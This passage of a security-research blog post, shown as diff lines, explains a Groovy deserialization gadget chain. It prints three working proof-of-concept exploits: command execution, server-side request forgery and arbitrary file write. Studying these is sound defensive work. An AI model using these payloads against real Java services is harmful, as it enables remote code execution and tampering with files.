+<span class="keyword">public static</span> <span class="type">Process</span> <span class="method">execute</span>(<span class="keyword">final</span> <span class="type">String</span> self, <span class="keyword">final</span> <span class="type">String</span>[] envp, <span class="keyword">final</span> <span class="type">File</span> dir) <span class="keyword">throws</span> <span class="type">IOException</span> {
+    <span class="keyword">return</span> <span class="type">ProcessGroovyMethods</span>.<span class="method">execute</span>(self, envp, dir);
+}</div>
+
+        <p>If we can reach this method, it will lead to code execution. The only restriction is that all argument data types must implement the Serializable interface.</p>
+
+        <p>The data types used are String and File &mdash; and fortunately, both implement Serializable.</p>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">java.lang.reflect.InvocationHandler</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Proxy</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Constructor</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Field</span>;
+<span class="keyword">import</span> <span class="type">java.util.Base64</span>;
+<span class="keyword">import</span> <span class="type">java.util.Comparator</span>;
+<span class="keyword">import</span> <span class="type">java.util.HashMap</span>;
+<span class="keyword">import</span> <span class="type">java.util.Map</span>;
+<span class="keyword">import</span> <span class="type">java.util.PriorityQueue</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayOutputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.File</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectOutputStream</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.ConvertedClosure</span>;
+<span class="keyword">import</span> <span class="type">groovy.lang.Closure</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+<span class="keyword">import</span> <span class="type">java.net.URL</span>;
+
+<span class="keyword">class</span> <span class="type">exploit</span> {
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span>[] args) {
+      <span class="keyword">try</span>{
+            <span class="type">File</span> f1 = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">"D:\\Security Research\\Java Research\\...\\groovy1\\"</span>);
+            <span class="type">String</span>[] envp = <span class="keyword">new</span> <span class="type">String</span>[]{<span class="string">"foo=bar"</span>};
+            <span class="type">String</span> command = <span class="string">"notepad.exe"</span>;
+
+            <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(command, <span class="string">"execute"</span>);
+
+        <span class="comment">// Wrap it in ConvertedClosure, specifying which method to intercept</span>
+            <span class="type">ConvertedClosure</span> handler = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(mc, <span class="string">"compare"</span>);
+
+            <span class="type">Comparator</span> proxy = (<span class="type">Comparator</span>) <span class="type">Proxy</span>.<span class="method">newProxyInstance</span>(
+            <span class="type">ConvertedClosure</span>.<span class="keyword">class</span>.<span class="method">getClassLoader</span>(),
+            <span class="keyword">new</span> <span class="type">Class</span>&lt;?&gt;[]{ <span class="type">Comparator</span>.<span class="keyword">class</span> },
+            handler
+        );
+
+            <span class="type">PriorityQueue</span>&lt;<span class="type">Object</span>&gt; priorityQueue = <span class="keyword">new</span> <span class="type">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, (<span class="type">Comparator</span>&lt;<span class="type">Object</span>&gt;) proxy);
+
+            <span class="comment">// Using Reflection to set the queue entries</span>
+            <span class="type">Field</span> queueField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"queue"</span>);
+            queueField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            queueField.<span class="method">set</span>(priorityQueue, <span class="keyword">new</span> <span class="type">Object</span>[]{ envp, f1 }); <span class="comment">// passing envp and f1 as per execute() signature</span>
+
+            <span class="type">Field</span> sizeField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"size"</span>);
+            sizeField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            sizeField.<span class="method">set</span>(priorityQueue, <span class="number">2</span>);
+
+            <span class="type">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="type">ByteArrayOutputStream</span>();
+            <span class="type">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(bos);
+            oos.<span class="method">writeObject</span>(priorityQueue);
+            oos.<span class="method">close</span>();
+
+            <span class="type">String</span> encoded = <span class="type">Base64</span>.<span class="method">getEncoder</span>().<span class="method">encodeToString</span>(bos.<span class="method">toByteArray</span>());
+            <span class="type">System</span>.out.<span class="method">println</span>(encoded);
+
+}<span class="keyword">catch</span>(<span class="type">Exception</span> e)
+{
+    e.<span class="method">printStackTrace</span>();
+}
+
+    }
+}</div>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (5).png" alt="Successful RCE via PriorityQueue">
+        </div>
+
+        <p>Similarly, we can use the same technique to achieve Server-Side Request Forgery (SSRF) and Arbitrary File Write.</p>
+
+        <hr class="section-divider">
+
+        <h3>SSRF via PriorityQueue</h3>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">java.lang.reflect.InvocationHandler</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Proxy</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Constructor</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Field</span>;
+<span class="keyword">import</span> <span class="type">java.util.Base64</span>;
+<span class="keyword">import</span> <span class="type">java.util.Comparator</span>;
+<span class="keyword">import</span> <span class="type">java.util.HashMap</span>;
+<span class="keyword">import</span> <span class="type">java.util.Map</span>;
+<span class="keyword">import</span> <span class="type">java.util.PriorityQueue</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayOutputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectOutputStream</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.ConvertedClosure</span>;
+<span class="keyword">import</span> <span class="type">groovy.lang.Closure</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+<span class="keyword">import</span> <span class="type">java.net.URL</span>;
+
+<span class="keyword">class</span> <span class="type">exploit_ssrf_pq</span> {
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span>[] args) {
+      <span class="keyword">try</span>{
+        <span class="type">URL</span> u = <span class="keyword">new</span> <span class="type">URL</span>(<span class="string">"http://localhost:9001/pwnedViaJDViaPriorityQueue"</span>);
+        <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(u, <span class="string">"getText"</span>);
+
+        <span class="type">ConvertedClosure</span> handler = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(mc, <span class="string">"compare"</span>);
+
+            <span class="type">Comparator</span> proxy = (<span class="type">Comparator</span>) <span class="type">Proxy</span>.<span class="method">newProxyInstance</span>(
+            <span class="type">ConvertedClosure</span>.<span class="keyword">class</span>.<span class="method">getClassLoader</span>(),
+            <span class="keyword">new</span> <span class="type">Class</span>&lt;?&gt;[]{ <span class="type">Comparator</span>.<span class="keyword">class</span> },
+            handler
+        );
+
+            <span class="type">PriorityQueue</span>&lt;<span class="type">Object</span>&gt; priorityQueue = <span class="keyword">new</span> <span class="type">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, (<span class="type">Comparator</span>&lt;<span class="type">Object</span>&gt;) proxy);
+            <span class="type">Field</span> queueField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"queue"</span>);
+            queueField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            queueField.<span class="method">set</span>(priorityQueue, <span class="keyword">new</span> <span class="type">Object</span>[]{ <span class="keyword">new</span> <span class="type">HashMap</span>&lt;&gt;(), <span class="string">"UTF-8"</span> });
+
+            <span class="type">Field</span> sizeField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"size"</span>);
+            sizeField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            sizeField.<span class="method">set</span>(priorityQueue, <span class="number">2</span>);
+
+        <span class="comment">// Serialize and Deserialize</span>
+        <span class="type">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="type">ByteArrayOutputStream</span>();
+        <span class="type">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(bos);
+        oos.<span class="method">writeObject</span>(priorityQueue);
+        oos.<span class="method">close</span>();
+
+        <span class="type">String</span> encoded = <span class="type">Base64</span>.<span class="method">getEncoder</span>().<span class="method">encodeToString</span>(bos.<span class="method">toByteArray</span>());
+        <span class="type">System</span>.out.<span class="method">println</span>(encoded);
+        <span class="keyword">byte</span>[] decoded = <span class="type">Base64</span>.<span class="method">getDecoder</span>().<span class="method">decode</span>(encoded);
+        <span class="type">ByteArrayInputStream</span> bis = <span class="keyword">new</span> <span class="type">ByteArrayInputStream</span>(decoded);
+        <span class="type">ObjectInputStream</span> ois = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(bis);
+        ois.<span class="method">readObject</span>();
+        ois.<span class="method">close</span>();
+
+}<span class="keyword">catch</span>(<span class="type">Exception</span> e)
+{
+    e.<span class="method">printStackTrace</span>();
+}
+
+    }
+}</div>
+
+        <p>The above code targets the getText() method present in ResourceGroovyMethods.java:</p>
+
+        <div class="codeblock"><span class="keyword">public static</span> <span class="type">String</span> <span class="method">getText</span>(<span class="type">URL</span> url, <span class="type">Map</span> parameters, <span class="type">String</span> charset) <span class="keyword">throws</span> <span class="type">IOException</span> {
+    <span class="keyword">return</span> <span class="type">ResourceGroovyMethods</span>.<span class="method">getText</span>(url, parameters, charset);
+}</div>
+
+        <p>Since the URL class is also Serializable, we can use it to achieve SSRF.</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (7).png" alt="SSRF via PriorityQueue">
+        </div>
+
+        <hr class="section-divider">
+
+        <h3>Arbitrary File Write</h3>
+
+        <p>Similarly, we can target setText() to overwrite any file on the filesystem.</p>
+
+        <p><b>Target Function:</b></p>
+
+        <div class="codeblock"><span class="keyword">public static void</span> <span class="method">setText</span>(<span class="type">File</span> file, <span class="type">String</span> text, <span class="type">String</span> charset) <span class="keyword">throws</span> <span class="type">IOException</span> {
+    <span class="type">ResourceGroovyMethods</span>.<span class="method">setText</span>(file, text, charset);
+}</div>
+
+        <p><b>PoC Code:</b></p>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">java.lang.reflect.InvocationHandler</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Proxy</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Constructor</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Field</span>;
+<span class="keyword">import</span> <span class="type">java.util.Base64</span>;
+<span class="keyword">import</span> <span class="type">java.util.Comparator</span>;
+<span class="keyword">import</span> <span class="type">java.util.HashMap</span>;
+<span class="keyword">import</span> <span class="type">java.util.Map</span>;
+<span class="keyword">import</span> <span class="type">java.util.PriorityQueue</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayOutputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.File</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectOutputStream</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.ConvertedClosure</span>;
+<span class="keyword">import</span> <span class="type">groovy.lang.Closure</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+<span class="keyword">import</span> <span class="type">java.net.URL</span>;
+
+<span class="keyword">class</span> <span class="type">exploit_arbitrary_file_write</span> {
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span>[] args) {
+      <span class="keyword">try</span>{
+        <span class="type">File</span> f1 = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">"D:\\Security Research\\...\\poc.txt"</span>);
+        <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(f1, <span class="string">"setText"</span>);
+
+        <span class="comment">// Wrap it in ConvertedClosure, specifying which method to intercept</span>
+        <span class="type">ConvertedClosure</span> handler = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(mc, <span class="string">"compare"</span>);
+
+            <span class="type">Comparator</span> proxy = (<span class="type">Comparator</span>) <span class="type">Proxy</span>.<span class="method">newProxyInstance</span>(
+            <span class="type">ConvertedClosure</span>.<span class="keyword">class</span>.<span class="method">getClassLoader</span>(),
+            <span class="keyword">new</span> <span class="type">Class</span>&lt;?&gt;[]{ <span class="type">Comparator</span>.<span class="keyword">class</span> },
+            handler
+        );
+
+            <span class="type">PriorityQueue</span>&lt;<span class="type">Object</span>&gt; priorityQueue = <span class="keyword">new</span> <span class="type">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, (<span class="type">Comparator</span>&lt;<span class="type">Object</span>&gt;) proxy);
+            <span class="type">Field</span> queueField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"queue"</span>);
+            queueField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            queueField.<span class="method">set</span>(priorityQueue, <span class="keyword">new</span> <span class="type">Object</span>[]{ <span class="string">"POCWORKING"</span>, <span class="string">"UTF-8"</span> });
+
+            <span class="type">Field</span> sizeField = <span class="type">PriorityQueue</span>.<span class="keyword">class</span>.<span class="method">getDeclaredField</span>(<span class="string">"size"</span>);
+            sizeField.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+            sizeField.<span class="method">set</span>(priorityQueue, <span class="number">2</span>);
+
+        <span class="comment">// Serialize and Deserialize</span>
+        <span class="type">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="type">ByteArrayOutputStream</span>();
+        <span class="type">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(bos);
+        oos.<span class="method">writeObject</span>(priorityQueue);
+        oos.<span class="method">close</span>();
+
+        <span class="type">String</span> encoded = <span class="type">Base64</span>.<span class="method">getEncoder</span>().<span class="method">encodeToString</span>(bos.<span class="method">toByteArray</span>());
+        <span class="type">System</span>.out.<span class="method">println</span>(encoded);
+        <span class="keyword">byte</span>[] decoded = <span class="type">Base64</span>.<span class="method">getDecoder</span>().<span class="method">decode</span>(encoded);
+        <span class="type">ByteArrayInputStream</span> bis = <span class="keyword">new</span> <span class="type">ByteArrayInputStream</span>(decoded);
+        <span class="type">ObjectInputStream</span> ois = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(bis);
+        ois.<span class="method">readObject</span>();
+        ois.<span class="method">close</span>();
+
+}<span class="keyword">catch</span>(<span class="type">Exception</span> e)
+{
+    e.<span class="method">printStackTrace</span>();
+}
+
+    }
+}</div>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (8).png" alt="Arbitrary File Write PoC">
+        </div>
+
+        <p>Similarly, we can target different functions to exploit different vulnerabilities.</p>
+
+        <p>This is how the entire Gadget Chain works.</p>
+
+        <p><b>Hope you liked it. Happy Hacking!</b></p>
+
+    </div>
+</body>
+</html>
